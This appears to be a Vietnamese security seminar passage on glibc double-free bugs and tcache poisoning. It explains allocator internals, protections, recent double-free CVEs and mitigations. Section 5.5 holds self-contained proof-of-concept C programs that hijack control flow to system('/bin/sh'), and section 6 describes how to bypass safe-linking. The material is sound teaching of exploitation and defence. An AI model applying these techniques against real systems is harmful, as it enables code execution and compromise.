### 5.5 Ví dụ minh họa

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define BUFSIZE1    512
#define BUFSIZE2    ((BUFSIZE1 / 2) - 8)   /* = 248 → chunk 0x100 → thuộc tcache */

int main(int argc, char **argv) {
  char *i = (char *) malloc(BUFSIZE2);
  char *h = (char *) malloc(BUFSIZE2);

  free(i);    /* tcache[0x100] = i      */
  free(h);    /* tcache[0x100]: h → i   */

  char *j = (char *) malloc(BUFSIZE1);   /* chunk 0x210, lấy từ top;
                                            không đụng tới tcache bin 0x100 */
  strncpy(j, argv[1], BUFSIZE1 - 1);

  free(h);    /* 2.26–2.28: không kiểm tra → h->next = h (self-loop) */
  free(j);    /* vào tcache bin khác */
}
```

Phân tích (trên glibc **2.26–2.28** — giai đoạn tcache chưa kiểm tra trùng lặp):

1. `free(i)`, `free(h)`: hai chunk `0x100` vào tcache theo LIFO → danh sách `h → i`.
2. `malloc(512)` (cỡ `0x210`, khác size class): `j` được cắt từ top chunk; hai chunk trong tcache vẫn nguyên.
3. `free(h)` lần thứ hai: không có kiểm tra double free → `h` lại được đưa vào đầu bin; vì đầu bin đang là `h`, `h->next` trỏ về chính nó → danh sách thành `h → h` (self-loop), chunk `i` bị mất khỏi danh sách.
4. Các lần `malloc(248)` tiếp theo đều trả về `h` → hai (hay nhiều) con trỏ "hợp lệ" cùng trỏ một vùng nhớ — mảnh đất cho tcache poisoning/UAF.

```text
entries[14] sau từng dòng (cùng ví dụ, cùng biến i/h/j):

free(i)         entries[14] -> [i] -> NULL
free(h)         entries[14] -> [h] -> [i] -> NULL              (LIFO: h lên đầu)
malloc(512)->j  entries[14] -> [h] -> [i] -> NULL              (khác size class, không đụng)
free(h) LẦN 2   tcache_put(h,14): h->next = entries[14] (đang là h, mục 4.2-f)
                      ___
                     v   \
                entries[14] -> [h] -+          <- SELF-LOOP: h->next == h
                                               chunk [i] mất liên kết (vẫn còn
                                               trong bộ nhớ, chỉ rụng khỏi list)

malloc(248) #1  trả về h; entries[14] = h->next = h (KHÔNG đổi, vì self-loop)
malloc(248) #2  trả về h LẦN NỮA -> hai con trỏ a, b cùng trỏ 1 vùng nhớ = UAF
```

Trên các phiên bản khác:

- **glibc ≤ 2.25** (chưa có tcache): hai chunk `0x100` rơi vào unsorted bin và hợp nhất với nhau/top, nên sau `malloc(512)` thì `h` nằm giữa vùng dữ liệu của `j`; `free(h)` lần hai đọc metadata rác và thường abort. Muốn minh họa trên các bản này, dùng mẫu fastbin dup với chunk ≤ `0x80`.
- **glibc ≥ 2.29**: `free(h)` lần hai bị chặn ngay → `free(): double free detected in tcache 2`.

#### Sink A — ghi đè con trỏ hàm tự định nghĩa (không cần biết libc)

Mở rộng trực tiếp ví dụ trên: thêm một struct có con trỏ hàm, cùng size class `0x100` với `i`/`h`, rồi dùng chính `h` (đang dangling sau double free) để ghi tay giá trị `next` — đây là bước **tcache poisoning** (mục 6.4), thay cho self-loop ngẫu nhiên ở trên.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define BUFSIZE1    512
#define BUFSIZE2    ((BUFSIZE1 / 2) - 8)   /* 248 → chunk 0x100 → tcache */

struct target {
    void (*action)(void);                 /* con trỏ hàm nằm đầu struct */
    char  pad[BUFSIZE2 - sizeof(void *)];
};                                         /* sizeof == BUFSIZE2: cùng size class với i/h */

void safe(void) { puts("[safe] khong co gi xay ra"); }
void win(void)  { puts("[win] chiem duoc luong thuc thi qua tcache poisoning"); system("/bin/sh"); }

int main(int argc, char **argv) {
    struct target *t = malloc(sizeof(struct target));   /* chunk 0x100, cùng bin với i/h */
    t->action = safe;

    char *i = (char *) malloc(BUFSIZE2);
    char *h = (char *) malloc(BUFSIZE2);

    free(i);    /* tcache[0x100]: i      */
    free(h);    /* tcache[0x100]: h -> i */

    char *j = (char *) malloc(BUFSIZE1);
    strncpy(j, argv[1], BUFSIZE1 - 1);

    free(h);    /* double free: 2.26-2.28 khong check -> h->next = h (self-loop) */

    *(struct target **) h = t;   /* UAF write qua con trỏ h còn dangling:
                                     sửa h->next từ "h" thành "&t" (poisoning) */

    malloc(BUFSIZE2);                       /* tiêu thụ entry bị poison, trả về h */
    struct target *fake = malloc(BUFSIZE2); /* trả về CHÍNH t */

    fake->action = win;   /* ghi đè con trỏ hàm của t qua "fake" */
    t->action();          /* code gốc gọi qua t như bình thường -> win() */
    return 0;
}
```

```text
Trước poisoning (self-loop, thừa kế từ sơ đồ mục 5.5):
  entries[14] -> [h] -+   (h->next == h)
             ^_________|

UAF write qua con trỏ h còn dangling:  *(struct target **) h = t;
  entries[14] -> [h] --next--> [ t ]            <- next bị đổi hướng sang t
                               (chunk KHÔNG được free, vẫn "sống" trong app)

malloc(BUFSIZE2) #1   trả về h; entries[14] = h->next = t
malloc(BUFSIZE2) #2   trả về CHÍNH t  <- "arbitrary allocation" (mục 6.2),
                       gán cho biến "fake"

fake->action = win;   -------> ghi đè t->action (cùng 1 vùng nhớ, 2 tên gọi)
t->action();          -------> gọi qua t như bình thường -> thực thi win()
```

Không cần biết địa chỉ `t` tuyệt đối hay tắt ASLR — `t` đã nằm sẵn trong tay chương trình (biến local), nên không cần leak gì cả. Đây là lý do mục 7.1 liệt kê "chunk mục tiêu overlap với structure có giá trị khai thác" là điều kiện riêng, độc lập với điều kiện "biết địa chỉ heap" (chỉ cần khi mục tiêu nằm ngoài tầm biết trước, như Sink B).

#### Sink B — ghi đè `__free_hook` → `system()` (RCE)

Thay mục tiêu bằng `__free_hook` (malloc.c:1864, mục 5.1) — biến toàn cục trong libc, không nằm trong tay chương trình, nên **cần biết địa chỉ tuyệt đối** của nó trước (ASLR, mục 7.2):

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define BUFSIZE1    512
#define BUFSIZE2    ((BUFSIZE1 / 2) - 8)   /* 248 → chunk 0x100 → tcache */

extern void (*__free_hook) (void *, const void *);  /* tồn tại trong glibc < 2.34, mục 6.1 */

int main(int argc, char **argv) {
    char *i = (char *) malloc(BUFSIZE2);
    char *h = (char *) malloc(BUFSIZE2);

    free(i);    /* tcache[0x100]: i      */
    free(h);    /* tcache[0x100]: h -> i */

    char *j = (char *) malloc(BUFSIZE1);
    strncpy(j, argv[1], BUFSIZE1 - 1);

    free(h);    /* double free -> h->next = h (self-loop) */

    *(void **) h = (void *) &__free_hook;   /* poisoning: next -> &__free_hook
                                                (cần địa chỉ tuyệt đối, xem mục 7.2) */

    malloc(BUFSIZE2);                                 /* tiêu thụ entry poison, trả về h */
    void **hook_slot = (void **) malloc(BUFSIZE2);    /* trả về ĐÚNG &__free_hook */

    *hook_slot = (void *) system;    /* __free_hook = &system */

    free("/bin/sh");   /* __libc_free thay logic thực bởi __free_hook(ptr, ...)
                           == system("/bin/sh") — xem dòng hook check ở mục 5.1 */
    return 0;
}
```

`free("/bin/sh")` an toàn ở đây vì `__libc_free` kiểm tra `__free_hook` **trước** khi chạm tới `mem2chunk` (mục 5.1) — chuỗi `"/bin/sh"` không bao giờ bị hiểu như một chunk thật. Chữ ký hook `(void *, const void *)` khác `system(const char *)`, nhưng ABI x86-64 truyền đối số đầu qua `rdi` và `system()` chỉ đọc đối số đầu, nên vẫn chạy đúng.

So sánh hai sink: Sink A không cần leak gì (mục tiêu đã trong tay); Sink B cần biết `&__free_hook` tuyệt đối — nếu ASLR đang bật phải leak libc base trước (mục 7.2), nếu không sẽ segfault hoặc trúng `malloc(): unaligned tcache chunk detected` thay vì shell.

Cả hai PoC chỉ đi hết được chuỗi trên glibc 2.26–2.28 thật (ví dụ container `ubuntu:18.04`/glibc 2.27). Trên glibc ≥ 2.29, dòng `*(...) h = ...` vẫn ghi được (UAF write không bị chặn), nhưng `free(h)` lần hai đã abort ngay từ `malloc.c:4201` (mục 5.4) — không bao giờ tới được bước poisoning. Trên glibc ≥ 2.34, dòng `extern void (*__free_hook)...` ở Sink B sẽ lỗi linker "undefined reference" vì symbol đã bị gỡ (mục 6.1).

## 6. Tcache poisoning

Ví dụ 5.5 kết thúc bằng một self-loop (`h → h`) — chính trạng thái đó là một dạng UAF: hai (hay nhiều) lần `malloc()` tiếp theo cùng trả về một vùng nhớ, cho attacker quyền ghi vào một chunk mà chương trình vẫn tin là "đã cấp phát hợp lệ". Đây chính là primitive mà kỹ thuật dưới đây khai thác tiếp — double free ở mục 5 không tự ghi đè được gì, nó chỉ *tạo ra* cơ hội ghi đè. Từ glibc 2.29, tcache phát hiện được cả `free(a); free(a)` trực tiếp (nhờ trường `key` + duyệt danh sách), nên muốn `malloc()` trả về một địa chỉ tự chọn, ta thường dùng **tcache poisoning**: làm hỏng con trỏ `next` của một chunk đã free để điều hướng lần cấp phát kế tiếp.

### 6.1 Ràng buộc trên glibc hiện đại

| Phiên bản | Cơ chế | Ảnh hưởng tới kỹ thuật |
| --- | --- | --- |
| 2.29+ | phát hiện double free qua trường `key` | free trùng trực tiếp bị abort; phải ghi đè `key` (qua UAF) hoặc đẩy chunk xuống fastbin |
| 2.32+ | safe-linking cho `next` của tcache/fastbin | muốn giả mạo `next` phải có heap leak để tính giá trị mã hóa |
| 2.34+ | bỏ `__malloc_hook` / `__free_hook` | kỹ thuật ghi đè hook chỉ còn dùng cho target glibc cũ, không áp dụng cho bản mới |
| các bản mới | kiểm tra căn chỉnh chunk trả về | con trỏ sai căn chỉnh → `malloc(): unaligned tcache chunk detected` |

Safe-linking mã hóa con trỏ `next` theo công thức:

```text
stored_next = target ^ (address_of_next_field >> 12)
```

Mặt nạ XOR được sinh từ **địa chỉ ô nhớ lưu con trỏ**, nên nếu chưa biết địa chỉ heap thì không thể tạo ra `next` giả hợp lệ.

### 6.2 Mục tiêu thực tế của kỹ thuật

- Trả về chunk chồng lên một **object khác trên heap** → đọc/ghi tùy ý.
- Trả về chunk chồng lên **cấu trúc toàn cục/ứng dụng** → ghi đè con trỏ mà chương trình dùng về sau.
- Trả về chunk chồng lên cấu trúc dùng cho **FSOP/ROP** → ghi đè để chiếm luồng thực thi.

### 6.3 tcache_entry — vùng dữ liệu bị lợi dụng

```c
struct tcache_entry {
    struct tcache_entry *next;   /* qword đầu tiên của user data */
    uintptr_t key;               /* qword thứ hai (2.29+)         */
};
```

Sau mỗi lần `free()`, qword đầu tiên của user data trở thành con trỏ của danh sách liên kết đơn, qword thứ hai là `key` dùng cho kiểm tra double free. Nếu lỗ hổng cho phép ghi đè một trong hai:

- hỏng `next` → **arbitrary allocation** (cấp phát tại địa chỉ tự chọn);
- hỏng `key` → **bypass double-free detection** ← trọng tâm phần seminar của chúng ta.

### 6.4 Quy trình poisoning cơ bản

1. Có primitive cho phép chỉnh sửa một chunk đã bị free (UAF/overflow).
2. `free()` một chunk cùng size class với mục tiêu.
3. Nếu safe-linking được bật: leak (hoặc suy luận) địa chỉ heap của chunk đã free.
4. Ghi đè `next` bằng giá trị đã mã hóa của địa chỉ đích.
5. `malloc()` một lần để tiêu thụ entry bị hỏng.
6. `malloc()` lần nữa để nhận chunk tại địa chỉ đã chọn.

Với glibc 2.32+, giá trị cần ghi:

```c
fake_next = target ^ (address_of_victim_next_field >> 12)
```

Nếu `target` không phù hợp với kỳ vọng của allocator (ví dụ sai căn chỉnh), `malloc()` sẽ abort trước khi ta chạm tới dữ liệu.

### 6.5 Tcache index & tcache metadata attack

Đầu vùng nhớ heap (theo mặc định trên các bản glibc cũ) là cấu trúc `tcache_perthread_struct`: `counts[]` (số chunk mỗi index) và `entries[]` (đầu danh sách mỗi index). Nếu ghi được vào cấu trúc này, ta điều khiển được **cả lớp kích thước cùng lúc** thay vì một chunk đơn lẻ:

- sửa `entries[idx]` → mọi `malloc()` cùng size class sau đó trả về địa chỉ do ta chọn;
- sửa `counts[idx]` → lừa glibc tin rằng bin còn chunk dù thực tế không có.

Các biến thể hiện đại đáng chú ý:

- **House of Water** — biến lỗi UAF/tràn thành quyền kiểm soát `tcache_perthread_struct`; là hướng giải quyết hiện đại khi safe-linking khiến việc làm hỏng free list trực tiếp trở nên khó khăn.
- **Safe-link double protect** — lợi dụng các đường cấp phát "bảo vệ lại" một giá trị đã được bảo vệ; kỹ thuật sắp xếp vị trí các con trỏ sao cho các mặt nạ XOR triệt tiêu hoặc biến đổi thành giá trị cần thiết. Lưu ý: XOR hai lần một con trỏ đã được bảo vệ là **chưa đủ**, vì `PROTECT_PTR` sinh mặt nạ từ địa chỉ lưu trữ.
- **Tcache relative write** — nếu làm hỏng được tham số như `mp_.tcache_bins`, glibc có thể tính ra `tc_idx` vượt phạm vi và ghi metadata tcache **ngoài** vùng heap dự kiến.
- **glibc 2.42 metadata hijacking** — how2heap ghi nhận `tcache_perthread_struct` có thể được khởi tạo **muộn hơn** (không còn luôn là cấp phát heap đầu tiên) nếu hoạt động heap đầu tiên dùng chunk lớn không chạm tcache; khi đó lỗi tràn/UAF trên chunk lớn phía trước có thể ghi trực tiếp vào `entries[]`, khiến `malloc()` nhỏ kế tiếp trả về địa chỉ do kẻ tấn công chọn.

### 6.6 Một số biến thể hiện đại khác

#### House of Botcake

Giải pháp tiêu chuẩn khi tcache dup cũ không còn hiệu quả: dùng **consolidation với unsorted bin** để chunk mục tiêu vừa nằm trong tcache vừa là một phần của vùng nhớ đã free lớn hơn; sau khi giành lại quyền ghi vào vùng chồng lấn, ta poisoning entry tcache như bình thường.

Phù hợp khi: kích hoạt được consolidation; double free bị tcache chặn; đủ quyền kiểm soát heap để khôi phục chunk mục tiêu và ghi lại `next` đã mã hóa.

#### Tcache stashing unlink attack

Không ghi đè `next` trực tiếp mà lợi dụng đường glibc chuyển chunk từ **smallbin vào tcache**: nếu làm hỏng metadata smallbin (thường là `bk`) trước khi chuyển, glibc có thể **stash một chunk giả vào tcache**, sau đó một `malloc()` bình thường sẽ trả về nó.

#### Bypass safe-linking

Trên glibc 2.32+, câu hỏi không còn là "ghi đè `next` thế nào?" mà là "tạo con trỏ protected hợp lệ thế nào?":

- leak heap bằng cách đọc/in một chunk tcache đã free;
- dùng overlap/UAF để khôi phục heap base rồi mã hóa con trỏ theo công thức;
- lợi dụng primitive "bảo vệ hai lần" hoặc ghi vào metadata tcache thay vì một entry;
- đọc lại con trỏ bị mã hóa từ chunk đã free và dùng helper như `decrypt_safe_linking` để khôi phục địa chỉ thật trước khi giả mạo `next`.

## 7. Điều kiện, cơ chế bảo vệ và giới hạn khả năng khai thác

Double free bị allocator chặn (mục 5.4) không có nghĩa là hết đường khai thác — nó chỉ đẩy attacker sang tcache poisoning (mục 6). Nhưng tạo ra được chunk tại "địa chỉ tuỳ chọn" cũng không đồng nghĩa với chiếm được luồng thực thi: giữa hai điểm đó còn nhiều lớp bảo vệ độc lập với allocator. Phần này tách rõ ba câu hỏi: *cần gì để đi hết chuỗi khai thác*, *lớp nào đang chặn ở đâu*, và *tại sao vẫn có CVE thực tế* (mục 8).

### 7.1 Điều kiện cần để chuỗi khai thác đi hết chặng đường

Không phải cứ có double free là có RCE. Chuỗi `double free → UAF → tcache poisoning → ghi tuỳ ý → chiếm luồng thực thi` chỉ đi hết nếu đồng thời thoả:

| Điều kiện | Vì sao cần |
| --- | --- |
| Chunk bị free và chunk mục tiêu cùng size class | tcache/fastbin không coalesce, mỗi bin chỉ phục vụ đúng một khoảng size (mục 4) |
| Có primitive ghi vào chunk đã free (UAF hoặc overflow) | để sửa `next`/`key` của `tcache_entry` (mục 6.3) — double free chỉ *tạo ra* UAF, không tự ghi được gì |
| Biết (hoặc leak được) địa chỉ heap, nếu glibc ≥ 2.32 | safe-linking mã hoá `next` theo địa chỉ lưu trữ (mục 6.1) — không có leak thì không tạo được giá trị mã hoá hợp lệ |
| Kiểm soát được thứ tự `malloc()` kế tiếp | entry bị poison phải được tiêu thụ đúng lúc, không bị một `malloc()` khác cùng size class "chen ngang" |
| Chunk tại địa chỉ đích overlap với structure có giá trị khai thác | con trỏ hàm, GOT entry, `FILE`/`_IO_*` (FSOP) — overlap với dữ liệu "trơ" thì chỉ dừng ở leak/corrupt, chưa có execution control |

### 7.2 Cơ chế bảo vệ theo tầng

| Tầng | Cơ chế | Chặn gì trong chuỗi | Giới hạn còn lại / cách lọt |
| --- | --- | --- | --- |
| Allocator (glibc) | tcache `key` (2.29+), safe-linking (2.32+), bỏ `__malloc_hook`/`__free_hook` (2.34+), kiểm tra alignment | Free trùng trực tiếp; giả mạo `next` không mã hoá; ghi đè hook để nhảy thực thi | Đã phân tích ở mục 6.1 — vẫn lọt nếu có leak heap hoặc overflow đủ lớn để tạo UAF khác |
| OS / loader | **ASLR**: random hoá vị trí heap, libc, stack mỗi lần chạy | Không đoán được địa chỉ tuyệt đối để tính mask safe-linking hoặc trỏ tới hàm libc | Chỉ cần leak **một** địa chỉ (heap hoặc libc) là suy ra toàn bộ offset còn lại — ASLR không chặn, chỉ tăng chi phí |
| OS / loader | **PIE**: code base của binary cũng bị randomize, không cố định như binary non-PIE | ROP gadget trong chính binary không còn ở địa chỉ tĩnh | Cần thêm info leak cho code base, tương tự ASLR libc |
| CPU / OS | **NX/DEP**: trang stack/heap không được đánh dấu executable | Không thể nhảy thẳng vào shellcode ghi trên heap/stack | Buộc chuyển sang ROP hoặc FSOP (mục 6.2) — đổi hướng kỹ thuật, không chặn hoàn toàn |
| Linker | **RELRO** (Partial/Full) | Full RELRO: GOT read-only sau khi resolve → chặn kỹ thuật ghi đè GOT entry cổ điển | Không ảnh hưởng hook overwrite (glibc < 2.34) hay FSOP — hai hướng này vẫn mở |
| Compiler | **Stack canary**, `_FORTIFY_SOURCE` | Canary không liên quan trực tiếp tới heap; `_FORTIFY_SOURCE` có thể bắt một số overflow (vd `strcpy` tràn) trước khi nó kịp tạo UAF | Không bắt được lỗi logic thuần (free hai lần một con trỏ hợp lệ, không tràn buffer) |
| Runtime / deploy | seccomp, sandbox, chạy service quyền thấp | Giới hạn syscall/tài nguyên **sau khi** đã chiếm luồng thực thi | Không ngăn khai thác heap, chỉ giảm tác động cuối (CVE-2026-33824 chạy trong context SYSTEM của dịch vụ — sandbox yếu không giảm được mức này) |

Ghi chú: các lớp này **độc lập nhau theo thiết kế** (defense in depth) — attacker phải vượt qua gần hết cùng lúc chứ không chỉ một lớp, nhưng cũng chỉ cần một lớp bị cấu hình sai hoặc tắt (binary compile không PIE, service tắt ASLR để debug...) là giảm hẳn độ khó của toàn chuỗi.

### 7.3 Vì sao vẫn có CVE thực tế dù đủ lớp bảo vệ

Mục 8 cho thấy điều kiện ở 7.1 vẫn được thoả trong các triển khai cụ thể: CVE-2026-23918 cần thêm info leak + heap spray trước khi có RCE — đúng như dự đoán ở 7.2 (ASLR chỉ tăng chi phí, không chặn); điều kiện RCE còn phụ thuộc cấu hình triển khai (APR dùng mmap allocator) chứ không chỉ vào bản thân lỗi double free. Đây là lý do mục 8 phân biệt rõ "Tác động" (worst case) và "Điều kiện khai thác" (khi nào worst case đó đạt được).

## 8. CVE thực tế (2025–2026)

Ba case dưới đây là minh chứng cho mục 7.3: dù đủ các lớp bảo vệ ở mục 7.2, double free (CWE-415) vẫn bị khai thác thực tế khi điều kiện triển khai cụ thể (cấu hình, allocator, thời điểm patch) thoả mãn mục 7.1. Tổng quan các CVE double free (CWE-415) nghiêm trọng, đã bị khai thác thực tế trong giai đoạn 2025–2026:

| Năm | CVE | Sản phẩm | Chuỗi | CVSS | Trạng thái khai thác |
| --- | --- | --- | --- | --- | --- |
| 2026 | CVE-2026-33824 | Windows IKE Extension (`ikeext.dll`) | double free → RCE từ xa không xác thực | **9.8 – Critical** | Đã khai thác thực tế (CISA KEV 18/8/2026) |
| 2026 | CVE-2026-23918 | Apache HTTP Server 2.4.66 (`mod_http2`) | double free → DoS/RCE | 8.8 – High | Đã khai thác DoS thực tế |
| 2025 | CVE-2025-62215 | Windows Kernel | race condition → double free → EoP | 7.0 – High | Đã khai thác thực tế (CISA KEV 12/11/2025) |

### 8.1 CVE-2026-33824 — Windows IKE Extension (2026, đại diện Critical)

| Trường | Nội dung |
| --- | --- |
| **Sản phẩm bị ảnh hưởng** | Windows IKE Extension (`ikeext.dll` — dịch vụ IKEEXT, nền tảng Windows IPsec/IKEv2 VPN): Windows 10/11 và Windows Server 2016–2025 chưa vá |
| **Phân loại** | CWE-415 Double Free; CVSS 3.1 = **9.8 Critical** (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`) |
| **Nguyên nhân** | Trong quá trình lắp ghép (reassembly) thông điệp IKEv2 `IKE_AUTH` bị phân mảnh, con trỏ tới blob "Security Realm" (thuộc cấu trúc MMSA) bị **sao chép nông** (shallow copy) sang PacketContext; cả hai ngữ cảnh đều giải phóng cùng một vùng heap → double free (phân tích của TrendAI/ZDI) |
| **Tác động** | Crash dịch vụ IKEEXT hoặc **thực thi mã tuỳ ý trong context SYSTEM** của dịch vụ; RCE từ xa không xác thực, không tương tác người dùng → được xếp loại "wormable" |
| **Điều kiện khai thác** | Chỉ cần gửi IKE/IKEv2 tới UDP 500/4500: một `IKE_SA_INIT` có Security Realm Vendor ID, sau đó các fragment `IKE_AUTH` (RFC 7383) → chạm đường xử lý lỗi **trước khi peer được xác thực**; không cần tài khoản VPN, không cần VA |
| **Biện pháp khắc phục** | Cập nhật bản vá Microsoft tháng 4/2026 (hoặc mới hơn); nếu chưa vá: chặn UDP 500/4500 với host không cần IKE, giới hạn peer tin cậy, không expose VPN/IPsec trực tiếp ra Internet khi không cần thiết |
| **Liên hệ chuỗi khai thác** | Đúng mô hình của seminar: double free → heap corruption → tái sử dụng vùng đã free → kiểm soát object/con trỏ → thực thi mã trong context dịch vụ đặc quyền |

### 8.2 CVE-2026-23918 — Apache HTTP Server, double free trong mod_http2 (2026)

| Trường | Nội dung |
| --- | --- |
| **Sản phẩm bị ảnh hưởng** | Apache HTTP Server **2.4.66** (`mod_http2`, MPM đa luồng: worker/event; prefork không bị ảnh hưởng) |
| **Phân loại** | CWE-415 Double Free; CVSS 8.8 (High) |
| **Nguyên nhân** | Client gửi HEADERS rồi RST_STREAM (mã lỗi khác 0) trên cùng một stream trước khi multiplexer đăng ký stream: hai callback của nghttp2 (`on_frame_recv_cb` và `on_stream_close_cb`) đều gọi `h2_mplx_c1_client_rst` → `m_stream_cleanup` đẩy cùng con trỏ `h2_stream` vào mảng cleanup hai lần → `h2_stream_destroy` free lần hai (`h2_mplx.c`) |
| **Tác động** | DoS từ xa tầm thường (1 kết nối TCP, 2 frame, không cần xác thực); RCE khi APR dùng mmap allocator (mặc định trên Debian/Ubuntu và Docker chính thức): đặt fake `h2_stream` vào vùng vừa free, trỏ con trỏ hàm cleanup của pool tới `system()`, dùng scoreboard (địa chỉ cố định) chứa payload |
| **Điều kiện khai thác** | HTTP/2 bật + MPM đa luồng; RCE cần thêm info leak và heap spray (đã được chứng minh trong phòng lab) |
| **Biện pháp khắc phục** | Nâng lên 2.4.67; tạm thời tắt `mod_http2`; chỉ 2.4.66 bị ảnh hưởng (2.4.65 và 2.4.67 trở đi an toàn) |

### 8.3 CVE-2025-62215 — Windows Kernel, race condition dẫn tới double free (2025)

| Trường | Nội dung |
| --- | --- |
| **Sản phẩm bị ảnh hưởng** | Windows Kernel (Windows 10/11, Windows Server 2019–2025 chưa vá) |
| **Phân loại** | CWE-362 (race condition) + CWE-415 (double free); CVSS 3.1 = 7.0 (High) |
| **Nguyên nhân** | Đồng bộ sai tài nguyên dùng chung trong kernel (race condition) cho phép cùng một đối tượng kernel bị giải phóng hai lần |
| **Tác động** | Leo thang đặc quyền cục bộ lên **SYSTEM**; đã bị khai thác thực tế dưới dạng zero-day |
| **Điều kiện khai thác** | Người dùng cục bộ có quyền thấp; cần thắng race (thử lặp nhiều lần) |
| **Biện pháp khắc phục** | Cập nhật bản vá Patch Tuesday tháng 11/2025 của Microsoft; theo dõi CISA KEV |

Điểm chung của cả ba CVE: vùng nhớ (hoặc đối tượng) bị giải phóng hai lần → allocator phân phối lại cùng vùng nhớ cho hai mục đích khác nhau → kẻ tấn công ghi đè cấu trúc/con trỏ → chiếm quyền thực thi. Đây chính là "chuỗi khai thác" mà seminar minh họa trên userland (glibc): **double free → alias hai con trỏ → poisoning → ghi tuỳ ý → chiếm luồng thực thi**. Mục 9 tổng hợp từ ba case này thành biện pháp khắc phục ở nhiều tầng — không chỉ vá riêng từng CVE mà loại bỏ cả lớp lỗi CWE-415.

## 9. Biện pháp khắc phục và phòng ngừa

Double free là lỗi về **quyền sở hữu vùng nhớ** (mục 5.2), nên biện pháp hiệu quả nhất nằm ở tầng thiết kế code, không chỉ ở tầng vá từng chunk. Dưới đây chia theo tầng, từ rẻ/sớm nhất đến tốn kém/muộn nhất.

### 9.1 Tầng mã nguồn (ngăn lỗi phát sinh)

- **Một con trỏ — một chủ sở hữu**: xác định rõ hàm/struct nào chịu trách nhiệm `free()`; tránh để hai con trỏ alias cùng trỏ một vùng nhớ mà không rõ ai free trước (mục 5.2).
- **`free()` xong, gán lại `NULL` ngay**: `free(NULL)` hợp lệ theo chuẩn C và không làm gì — cách rẻ nhất chặn phần lớn case thực tế (`free(p); p = NULL;`).
- **Không `free()` trong nhánh lỗi rồi `free()` lại ở cleanup chung** (mẫu lỗi điển hình ở mục 5.2) — chọn một trong hai nơi chịu trách nhiệm, không cả hai.
- **C++**: dùng `std::unique_ptr`/`std::shared_ptr` thay con trỏ thô — compiler/runtime tự quản lý vòng đời, loại bỏ toàn bộ lớp lỗi double-free/UAF do thiết kế.
- **Đa luồng**: nếu nhiều thread cùng tham chiếu một object, dùng refcount đúng (atomic) hoặc lock quanh free, không free "optimistic" dựa trên điều kiện race (như CVE-2025-62215, mục 8.3).

### 9.2 Tầng công cụ (phát hiện trước khi ship)

- **AddressSanitizer** (`-fsanitize=address`): bắt double-free/UAF ngay khi chạy, kèm stack trace cả hai lần free — nên bật trong CI cho test suite.
- **Valgrind** (`--tool=memcheck`): chậm hơn ASan nhưng không cần biên dịch lại.
- **`MALLOC_CHECK_=3`** (glibc): bật kiểm tra heap runtime nhẹ hơn ASan, dùng được cả với binary đã build sẵn.
- **Static analysis** (Clang Static Analyzer, Coverity, Cppcheck): bắt một số pattern double-free tĩnh, hữu ích cho nhánh lỗi không được test cover.
- **Fuzzing có ASan** (libFuzzer, AFL++): hiệu quả nhất với double-free phụ thuộc input — đúng mô tả ở mục 5.2 ("hai con trỏ alias", "đa luồng") thường chỉ lộ ra với input/lịch trình cụ thể.

### 9.3 Tầng allocator/runtime (giảm thiệt hại khi lỗi đã lọt)

- glibc hiện đại tự có tcache `key` + safe-linking (mục 6.1) — không thay được code đúng, nhưng nâng chi phí khai thác.
- **Hardened allocator** (hardened_malloc, Scudo, tcmalloc): có thể dùng làm drop-in (`LD_PRELOAD`), bổ sung kiểm tra double-free/canary chunk chặt hơn glibc mặc định — phù hợp khi không sửa được toàn bộ codebase cũ.
- `GLIBC_TUNABLES=glibc.malloc.tcache_count=0`: chỉ nên dùng khi debug/nghiên cứu (mục 4), **không** dùng làm biện pháp phòng ngừa production — tắt tcache không sửa lỗi logic, chỉ đổi đường đi của nó (rơi xuống fastbin/unsorted bin, mục 5.5).

### 9.4 Tầng hệ thống/vận hành (giảm blast radius)

- Giữ **ASLR/PIE/NX/RELRO Full** luôn bật ở production — không chặn được double-free nhưng tăng mạnh chi phí chuỗi khai thác (mục 7.2).
- Giảm attack surface theo khuyến nghị riêng từng CVE (mục 8): không expose dịch vụ VPN/IPsec (CVE-2026-33824) hoặc HTTP/2 (CVE-2026-23918) trực tiếp ra Internet khi không cần thiết.
- Patch management theo CISA KEV/NVD — double-free thường bị khai thác trong khung thời gian ngắn sau khi PoC công khai (mục 8).
- Chạy dịch vụ với quyền thấp nhất cần thiết + seccomp — không ngăn khai thác heap nhưng giới hạn hệ quả nếu chuỗi đi hết (mục 7.2).

## 10. Thuật ngữ nhanh

Tổng hợp các thuật ngữ đã dùng xuyên suốt mục 1–9, để tra cứu nhanh khi đọc lại hoặc trình bày:

| Thuật ngữ | Giải thích |
| --- | --- |
| chunk | Đơn vị cấp phát của glibc malloc: header (`prev_size`, `size`) + user data |
| arena | Vùng quản lý heap của glibc; main arena dùng chung, thread có thể có arena phụ |
| top chunk | Phần heap chưa cấp phát còn lại ở cuối heap |
| consolidation | Gộp các chunk rảnh kề nhau (hoặc với top) khi free |
| tcache_perthread_struct | Cấu trúc metadata tcache của mỗi thread (`counts[]`, `entries[]`), thường nằm đầu heap |
| safe-linking | Cơ chế (2.32+) mã hóa con trỏ `next` của tcache/fastbin: `stored = ptr ^ (pos >> 12)` |
| PROTECT_PTR / REVEAL_PTR | Macro mã hóa / giải mã con trỏ của safe-linking |
| heap leak | Rò rỉ địa chỉ heap/libc (qua read/in dữ liệu chunk) |
| tcache poisoning | Ghi đè `next` trong chunk đã free để điều hướng `malloc()` |
| arbitrary allocation | Khiến `malloc()` trả về chunk tại địa chỉ tuỳ ý |
| FSOP | File-Stream Oriented Programming — lợi dụng cấu trúc `FILE`/`_IO_*` để chiếm luồng thực thi |
| use-after-free (UAF) | Dùng con trỏ sau khi vùng nhớ đã bị free |

## Tài liệu tham khảo

- Blog cá nhân — [Malware for Beginners (Phần 1: Stack, heap và calling conventions)](https://nhan-laptop.github.io/posts/malware-binary/learning-Malware-for-beginner-part-1.html)
- HackTricks — [Double free](https://hacktricks.wiki/en/binary-exploitation/libc-heap/double-free.html)
- HackTricks — [Bins & memory allocations](https://hacktricks.wiki/en/binary-exploitation/libc-heap/bins-and-memory-allocations.html)
- HackTricks — [Tcache bin attack](https://hacktricks.wiki/en/binary-exploitation/libc-heap/tcache-bin-attack.html)
- OWASP — [Doubly freeing memory](https://owasp.org/www-community/vulnerabilities/Doubly_freeing_memory)
